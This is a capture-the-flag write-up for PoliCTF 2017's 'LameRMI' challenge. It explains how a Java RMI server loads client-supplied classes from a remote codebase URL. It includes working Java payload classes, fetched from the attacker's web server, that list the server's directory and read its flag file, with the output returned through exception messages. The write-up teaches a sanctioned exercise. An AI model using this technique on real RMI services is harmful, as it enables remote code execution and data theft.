# Writeup for LameRMI (pwn, 484 pts, 3 solves), PoliCTF 2017

Description:

> Bill is a computer science student. Bill managed to lock himself out of his own vps again. Bill remembers that a small program he wrote to understand RMI is still running on the server, and that to get it working he blindly copypasted snippets from stackoverflow and its professors slides. Maybe there's still hope of getting the flag he left there.
> Please help Bill
>
> `lamermi.chall.polictf.it`
>
> Update: Pay attention that "http://" is not written anywhere (read the description!)
>
> Update: I heard that Bill's security policy is not that strict...
>
> Update: There's a webserver running on port 8000 as well. You may (or may not) need it.

## TL;DR

- RMI server running on target

- We can inject code by passing custom objects to the remote method

- Due to a bad security manager we can access the file system

- Flag is stored in file `flag`

## RMI

The challenge description hints at RMI (Java remote method invocation), so the first step is to research what RMI is, how it works, and how we can exploit it; my main resources were the [Wikipedia article](https://en.wikipedia.org/wiki/Java_remote_method_invocation) and the [RMI section of The Java Tutorials](https://docs.oracle.com/javase/tutorial/rmi/index.html).

RMI allows code from one Java VM (the client) to invoke methods of an object inside another Java VM (the server). In order to do this, both client and server have to share a common interface, the *remote interface*, which declares all methods the client can invoke, i.e. the *remote interface* defines the functionality the server exposes to the client.
The client connects to the server and requests and receives a *remote object* implementing the *remote interface*. Now the client is able to call methods of the *remote object*, which get executed **inside the server JVM**.
Whenever the client supplies arguments, whose class is unknown to the server, to a method, the server will dynamically (i.e. at runtime) **load this client-provided class into the server JVM**. This way we can execute arbitrary code in the server JVM (usually the *security manager* prevents our code from doing anything malicious or harmful).

## Enumerating the Target

So much for the theory, let's take a look at the challenge server at `lamermi.chall.polictf.it`.

We use `nmap` to check the 100 most common ports as well as the 2 RMI ports (`1098` and `1099`): there is a web server running on port `8000`, and RMI port `1099` is open (the other RMI port is optional and not needed here).

First we take a look at the web server; we are greeted with a directory listing and click through the directories until we arrive at a single file: `lamermi.chall.polictf.it:8000/it/polictf/lamermi/AverageService.class`, which is a compiled Java class. Decompile it with [Bytecode Viewer](http://bytecodeviewer.com/) and we get:
```java
package it.polictf.lamermi;

import java.util.*;
import java.rmi.*;

public interface AverageService extends Remote {

	Double average(List<Integer> param) throws RemoteException;
}
```
Seems like we have found our *remote interface*!

## Intended Functionality

Now we can proceed and write our RMI client. After reading the examples provided in the resources mentioned above I came up with:
```java
package it.polictf.lamermi;

import java.util.*;
import java.rmi.registry.*;

public class MyClient {

	public static void main(String[] args) throws Exception {
		Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it");
		AverageService service = (AverageService) registry.lookup("AverageService");

		List<Integer> list = new ArrayList<Integer>();
		list.add(1);
		list.add(2);
		Double result = service.average(list);

		System.out.println("Result: " + result);
	}
}
```
This connects to the server, retrieves the *remote object* and calls `average` with the list `1, 2`: `Result: 1.5`.

We can use this functionality as intended. But how do we abuse the service to get the flag?

## Code Injection Technique

As I said earlier, if a class is unknown to the server, it will load it at runtime. To inject code, we define our own subclass of `ArrayList<Integer>` and supply that to the call to `average`:
```java
package it.polictf.lamermi;

import java.util.*;

public class Payload0 extends ArrayList<Integer> {
}
```
This payload does exactly nothing, but we can use it to test if we are able to inject arbitrary classes; running our client, we now get the following exception:
```
java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: it.polictf.lamermi.Payload0
		[...]
```
The server tries to load our class, but it doesn't know its class definition and fails.

Googling this error eventually lead to a [StackOverflow answer](https://stackoverflow.com/a/20938326/6762008) which tells us that the client has to provide a `java.rmi.server.codebase` setting, so that the server knows where to load our classes from. For this we need an HTTP server facing the internet; I used a free webspace provider, uploaded `Payload0.class` to `http://some-webserver/rmi/it/polictf/lamermi/Payload0.class` and specified `-Djava.rmi.server.codebase=http://some-webserver/rmi/`. When we now run our client again, we get the expected `Result: 1.5`.

But there's still one thing missing until we are able to execute arbitrary code and return its result: we have to overwrite a method of `List<Integer>` which gets called inside `average()` with our payload code, and we need a way to return results back to our client.
I used this payload to determine which methods are called inside `average()`:
```java
package it.polictf.lamermi;

import java.util.*;

public class Payload1 extends ArrayList<Integer> {

	public Integer get(int index) {
		throw new RuntimeException("get " + index);
	}

	public Iterator<Integer> iterator() {
		throw new RuntimeException("iterator");
	}

	public ListIterator<Integer> listIterator() {
		throw new RuntimeException("listIterator");
	}
}
```
Note that I have renamed the class to `Payload1`, because the server will only load unknown classes and since we submitted our previous payload the server knows the class `Payload0`. Of course we also have to upload `Payload1.class` to our webserver.

When we run this payload we get back a wrapped exception:
```
java.lang.RuntimeException: iterator
```
At this point I realised we can use the `throw new RuntimeException(string);` to send back any text to our client, which will come in handy for the next payloads.

## Getting the Flag

The flag is probably stored on the file system (maybe even in the current working directory), so let's list some files:
```java
package it.polictf.lamermi;

import java.util.*;
import java.io.*;

public class Payload2 extends ArrayList<Integer> {

	public Iterator<Integer> iterator() {
		File cwd = new File(".");
		String msg = cwd.getAbsolutePath() + ": ";
		for (String file : cwd.list())
			msg += file + ", ";
		throw new RuntimeException(msg);
	}
}
```
Running this, we see that a file named `flag` is inside the current working directory!

Now all that's left to do is reading the flag:
```java
package it.polictf.lamermi;

import java.util.*;
import java.io.*;

public class Payload3 extends ArrayList<Integer> {

	public Iterator<Integer> iterator() {
		String msg = "";
		try {
			BufferedReader br = new BufferedReader(new FileReader("flag"));
			String line = br.readLine();
			while (line != null) {
				msg += line + "\n";
				line = br.readLine();
			}
			br.close();
		} catch (IOException e) {
			msg = "error";
		}
		throw new RuntimeException(msg);
	}
}
```
Flag: `flag{Br4nd0n_W4ash_1s_b4ck_1n_t0wn!}`

## Conclusion

I'd like to thank [Tower of Hanoi](http://toh.necst.it/), who organized PoliCTF 2017, for this fun and interesting challenge.

This was the first challenge I ever got first blood on, and my very first writeup; I hope you enjoyed it!
